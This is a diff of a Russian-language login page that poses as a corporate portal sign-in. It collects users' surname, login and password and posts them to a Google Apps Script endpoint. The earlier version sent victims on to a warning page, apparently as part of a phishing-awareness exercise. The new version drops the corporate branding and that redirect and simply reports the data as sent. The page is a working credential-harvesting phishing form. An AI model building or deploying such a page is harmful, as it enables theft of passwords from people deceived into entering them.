@@ -3,142 +3,63 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Корпоративный портал | Вход в систему</title>
+  <title>Вход в систему</title>
   <style>
     body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+      font-family: Arial, sans-serif;
+      background: #e0e7ff;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
       margin: 0;
-      color: #2b2d42;
     }
-    .login-container {
+    .login-box {
       background: white;
       padding: 30px;
-      border-radius: 12px;
-      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
-      width: 400px;
-      animation: fadeIn 0.5s ease-out;
+      border-radius: 10px;
+      box-shadow: 0 10px 20px rgba(0,0,0,0.1);
+      width: 350px;
     }
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(20px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-    .logo {
-      text-align: center;
-      margin-bottom: 25px;
-    }
-    .logo img {
-      width: 70px;
-      height: 70px;
-      border-radius: 50%;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-    }
-    h1 {
-      font-size: 24px;
-      text-align: center;
-      margin-bottom: 15px;
-      color: #2b2d42;
-    }
-    .form-group {
-      margin-bottom: 20px;
-    }
-    label {
-      display: block;
-      margin-bottom: 8px;
-      font-weight: 600;
+    input, button {
+      width: 100%;
+      padding: 10px;
+      margin-top: 10px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
       font-size: 14px;
     }
-    input {
-      width: 100%;
-      padding: 12px 16px;
-      border: 1px solid #ddd;
-      border-radius: 8px;
-      font-size: 15px;
-      transition: all 0.3s ease;
-    }
-    input:focus {
-      border-color: #4361ee;
-      box-shadow: 0 0 0 3px rgba(67, 97, 238, 0.2);
-      outline: none;
-    }
     button {
-      width: 100%;
-      padding: 14px;
-      background: #4361ee;
+      background-color: #4f46e5;
       color: white;
-      border: none;
-      border-radius: 8px;
-      font-weight: 600;
-      font-size: 16px;
+      font-weight: bold;
       cursor: pointer;
-      transition: all 0.3s ease;
-      margin-top: 10px;
-    }
-    button:hover {
-      background: #3a56d4;
-      transform: translateY(-2px);
-    }
-    button:active {
-      transform: translateY(0);
-    }
-    .footer {
-      text-align: center;
-      margin-top: 25px;
-      font-size: 13px;
-      color: #6c757d;
-      padding-top: 15px;
-      border-top: 1px solid #eee;
     }
     .loading {
       display: none;
       text-align: center;
       margin-top: 15px;
-      color: #4361ee;
+      color: #4f46e5;
     }
   </style>
 </head>
 <body>
-  <div class="login-container">
-    <div class="logo">
-      <img src="https://www.gstatic.com/images/branding/product/1x/admin_512dp.png" alt="Логотип">
-    </div>
-    <h1>Вход в корпоративную систему</h1>
-
+  <div class="login-box">
+    <h2>Вход в систему</h2>
     <form id="loginForm">
-      <div class="form-group">
-        <label for="lastname">Фамилия</label>
-        <input type="text" id="lastname" name="lastname" required autocomplete="off">
-      </div>
-
-      <div class="form-group">
-        <label for="username">Логин</label>
-        <input type="text" id="username" name="username" required autocomplete="off">
-      </div>
-
-      <div class="form-group">
-        <label for="password">Пароль</label>
-        <input type="password" id="password" name="password" placeholder="Для двухфакторной аутентификации" autocomplete="off">
-      </div>
-
-      <button type="submit" id="submitBtn">Войти в систему</button>
-      <div class="loading" id="loading">Проверка учетных данных...</div>
+      <input type="text" id="lastname" placeholder="Фамилия" required>
+      <input type="text" id="username" placeholder="Логин" required>
+      <input type="password" id="password" placeholder="Пароль">
+      <button type="submit">Войти</button>
     </form>
-
-    <div class="footer">
-      <p>© 2025 ООО "Корпоративные решения". Все права защищены.</p>
-
-    </div>
+    <div class="loading" id="loading">Отправка...</div>
   </div>
 
   <script>
     document.getElementById('loginForm').addEventListener('submit', function(e) {
       e.preventDefault();
 
-      document.getElementById('submitBtn').style.display = 'none';
+      document.querySelector('button').style.display = 'none';
       document.getElementById('loading').style.display = 'block';
 
       const formData = {
@@ -147,27 +68,29 @@
         timestamp: new Date().toLocaleString()
       };
 
-      fetch('https://script.google.com/macros/s/AKfycbz5ZJu23AKy41hXgsmPSw_pyM4N-mpBuMK3wsCM38fyrkYfnvyF-2gGidyGp7f8t2RVxQ/exec', {
+      fetch('https://script.google.com/macros/s/AKfycbw04Rr8q1cfDadwgsgJpM0tfAbPcOzIY9HNImon8Obz-JrZ9-Otei3-D1zNUu5N61vQvQ/exec', {
         method: 'POST',
         body: JSON.stringify(formData),
         headers: {
           'Content-Type': 'application/json'
         }
       })
-      .then(response => {
-        if (response.ok) {
-          setTimeout(() => {
-            window.location.href = 'https://slonik-code.github.io/warning.html';
-          }, 1000);
+      .then(res => res.json())
+      .then(res => {
+        if (res.status === 'success') {
+          alert('Успешно отправлено!');
         } else {
-          throw new Error('Ошибка при отправке');
+          alert('Ошибка: ' + res.message);
         }
+        location.reload();
       })
-      .catch(error => {
-        console.error('Ошибка:', error);
-        window.location.href = 'https://slonik-code.github.io/warning.html';
+      .catch(err => {
+        alert('Ошибка соединения');
+        console.error(err);
+        location.reload();
       });
     });
   </script>
 </body>
 </html>
+
